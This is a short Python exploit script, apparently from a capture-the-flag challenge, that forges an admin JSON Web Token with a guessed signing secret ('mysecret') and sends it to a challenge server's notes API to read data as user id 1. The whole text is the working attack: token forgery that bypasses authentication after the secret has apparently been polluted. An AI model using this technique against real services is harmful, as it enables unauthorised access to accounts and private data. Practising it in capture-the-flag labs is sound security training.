import requests
import jwt

# If the secret was polluted, we can forge a token for user id 1
token = jwt.encode({"id": 1, "username": "admin"}, "mysecret", algorithm="HS256")
r = requests.get("http://exp.cybergame.sk:7021/api/v2/notes", headers={"Authorization": f"Bearer {token}"})
print(r.text)
